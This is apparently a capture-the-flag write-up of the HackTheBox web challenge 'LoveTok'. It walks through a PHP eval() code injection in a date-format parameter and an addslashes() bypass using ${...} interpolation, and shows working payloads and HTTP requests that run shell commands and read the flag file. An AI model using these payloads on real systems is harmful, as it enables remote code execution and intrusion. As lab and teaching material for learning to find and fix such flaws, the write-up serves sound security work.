---
layout: post
title: "LoveTok (HTB web)"
subtitle: "a php eval() in a date format string, with addslashes bypassed by backticks"
date: 2023-04-12
tags: [htb, ctf, web, php, rce]
category: writeups
kind: challenge
tldr: "The app builds a date string inside eval() from an attacker-controlled format value. addslashes() guards the input, but the backtick / ${} trick slips past it. I closed the date() call, injected system($_GET[1]), and read the flag file dropped at the filesystem root."
---

## the challenge

LoveTok was a small PHP app served behind nginx with php7.4-fpm on debian buster. The page was a love-themed countdown: a cyberpunk gif, a heading reading "You'll find love:", and a single line of server-rendered text predicting when I would find love. A red button at the bottom linked to `?format=r`, which was the giveaway: `format` was a request parameter that fed the date output, and `r` is the PHP `date()` character for an RFC 2822 timestamp. The whole UI was a hint pointing me at that one parameter.

The stack was confirmed by the response headers (nginx in front, php-fpm behind it) and the source, which shipped with the challenge. It was a hand-rolled MVC. `index.php` set the timezone, registered an autoloader that mapped any `*Controller` name to `controllers/` and any `*Model` name to `models/`, wired exactly one route, and dispatched it:

```php
<?php
date_default_timezone_set('UTC');

spl_autoload_register(function ($name){
    if (preg_match('/Controller$/', $name))
    {
        $name = "controllers/${name}";
    }
    else if (preg_match('/Model$/', $name))
    {
        $name = "models/${name}";
    }
    include_once "${name}.php";
});

$router = new Router();
$router->new('GET', '/', 'TimeController@index');

$response = $router->match();

die($response);
```

The `Router` was a generic class. `new()` registered a route, `match()` walked the registered routes against `$_SERVER['REQUEST_URI']` (stripped of its query string by `strtok(..., '?')`), and for a `Class@method` controller string it did `(new $class)->$function($this, $params)`. The one route mapped `GET /` to `TimeController@index`, so a request to `/` instantiated `TimeController` and called `index()`. The query string never touched routing, so my `?format=...` rode straight through to the controller untouched.

`TimeController::index()` read `format` from the query string, defaulting to `r`, built a `TimeModel` with it, and rendered the result into the `index` view:

```php
<?php
class TimeController
{
    public function index($router)
    {
        $format = isset($_GET['format']) ? $_GET['format'] : 'r';
        $time = new TimeModel($format);
        return $router->view('index', ['time' => $time->getTime()]);
    }
}
```

`Router::view()` ran `extract($data)` and included the view, so `['time' => ...]` became a `$time` variable inside `views/index.php`, which echoed it into a `<span>`:

```php
<span id='time'> <?= $time ?></span>
```

Whatever `getTime()` returned landed in the page body verbatim. So if I could make `getTime()` return command output, that output rendered straight back to me. The entire challenge lived in `TimeModel`:

```php
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->format = addslashes($format);

        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
        $this->prediction = "+${d} day +${h} hour +${m} minute +${s} second";
    }

    public function getTime()
    {
        eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
        return isset($time) ? $time : 'Something went terribly wrong';
    }
}
```

The constructor stored `addslashes($format)` and built a random `prediction` string for the relative time offset. `getTime()` then concatenated my `format` straight into a PHP statement and handed the whole string to `eval()`.

## the bug

The sink is `eval()`. `getTime()` glues `$this->format` into the middle of a string literal that `eval()` then runs as PHP source:

```php
eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
```

Control over `format` is control over PHP source, so this is straight code injection, not just date-format weirdness. The shape is identical to a quoted SQL injection. My input lands inside the `date("..."` argument, between the two double quotes. The standard move is to break out of that string literal, append my own statement, and neutralize the trailing `", strtotime("..."));` that the app still concatenates after my input. With a naive payload the source `eval()` sees would read like this:

```php
eval('$time = date("");system("ls");//", strtotime("..."));');
```

The `")` closes `date(` with an empty argument, `system("ls");` is my injected statement, and `//` comments out everything the app appends after me so the rest never parses. Clean break-out, classic injection.

The catch is the constructor. `addslashes($format)` runs before `getTime()` ever does, and it backslash-escapes the four characters `'`, `"`, `\`, and NULL. So any `"` I send to close the `date(` argument comes back as `\"`, which stays inside the string literal and never terminates it. The challenge even shipped a `test.php` demonstrating exactly this on a path-traversal string. The naive break-out is dead because I cannot get an unescaped quote into the source.

PHP hands a clean way around `addslashes()`. Inside a double-quoted string, PHP performs variable interpolation, and the complex `${...}` form evaluates whatever expression sits between the braces and splices the result back into the string. The key property: that expression is parsed and executed by the engine using only `$`, `{`, and `}` characters, none of which `addslashes()` touches. I never need a quote of my own to make code run. The string literal that `eval()` executes is double-quoted, so a `${...}` dropped inside it gets evaluated as PHP. The bypass technique is documented in the swordandcircuitboard "PHP addslashes command injection bypass" post, which is what the challenge author was pointing at.

The minimal proof of execution needs zero quotes:

```php
${print(`ls`)}
```

Backticks are PHP's shell-exec operator, equivalent to `shell_exec()`, `print` echoes the captured output back into the interpolated string, and there is not a single `'` or `"` for `addslashes()` to escape. Dropped into the `date(` argument, that runs a command and returns its output through `getTime()` into the page.

I wanted argument flexibility without re-editing the payload for every command, so I pulled the command itself out of a second GET parameter:

```php
${system($_GET[1])}
```

`system($_GET[1])` reads parameter `1` from the query string and executes it. Bare-word array keys like `$_GET[1]` (and `$_GET[a]`) need no quotes inside a double-quoted string, so this whole construct also survives `addslashes()` untouched, and the actual command travels in a separate parameter that never passes through the filter at all. The remaining problem is the `date("..."` wrapper still surrounding my payload. I need to close `date(` cleanly first. A `")` does that, and a leading backtick at the very start keeps the broken-up `date("` + my-text syntax from tripping a parse error before the engine reaches my `${...}`. The result is a self-contained complex-variable expression the engine evaluates.

## the solve

The final request put the addslashes-safe payload in `format` and the command in parameter `1`:

```http
GET /?format=`");${system($_GET[1])}&1=ls+../ HTTP/1.1
Host: TARGET
User-Agent: Mozilla/5.0
Accept: text/html
Connection: close
```

Reading the payload left to right: the leading backtick and `")` close out the `date(` argument and its open string so the rest parses, `${system($_GET[1])}` is the complex-variable expression that the double-quoted literal evaluates, and `1=ls ../` supplies the command through a parameter `addslashes()` never sees. The flag file is dropped at the filesystem root by the container entrypoint, which renames `/flag` to `/flag<random>` using five characters pulled from `/dev/urandom`:

```bash
FLAG=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1)
mv /flag /flag$FLAG
```

So the name is unguessable and I had to enumerate it. The reason `1=ls ../` reached the root is the working directory: nginx sets `root /www` and php-fpm executes from there, so `../` climbed one level straight to `/`. The rendered time line came back as a listing of `/`:

```text
bin
boot
dev
entrypoint.sh
etc
flagiOF1k
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
www
```

There was the randomized flag file sitting at `/`, alongside `entrypoint.sh` (the script that renamed it). The full response was a normal `200 OK` from nginx with the listing where the countdown text usually sits:

```http
HTTP/1.1 200 OK
Server: nginx
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 1866

...flagiOF1k...
```

A note on the bypass mechanics, since both payload forms matter. `${print(`ls`)}` is the smallest working primitive and proves execution with no extra parameters, but it bakes the command into `format`, so any command needing a quote or an awkward character would get mangled by `addslashes()`. `${system($_GET[N])}` is the practical form because the only part the filter can see is the constant `${system($_GET[1])}`, while the command rides in a separate parameter that bypasses `addslashes()` entirely. Other interchangeable inner expressions work too: `${phpinfo()}` confirms execution, `${system(ls)}` runs a bare command with no parameter. They all rely on the same property, that `${...}` interpolation runs an expression without any quote character the filter could catch.

## the flag

I swapped the command to read the file the listing revealed, keeping the same addslashes-safe `format`:

```http
GET /?format=`");${system($_GET[1])}&1=cat+../flagiOF1k HTTP/1.1
Host: TARGET
```

The file contents came back inline in the rendered time `<span>`, the same place the directory listing had appeared. It read `HTB{wh3n_l0v3_g3ts_eval3d_sh3lls_st4rt_p0pp1ng}`, an eval-to-shell theme. One `eval()` fed by a request parameter and guarded only by `addslashes()` was enough for full command execution once the `${...}` interpolation path stepped around the quote escaping, and the working directory at `/www` put the randomized flag one `../` away.
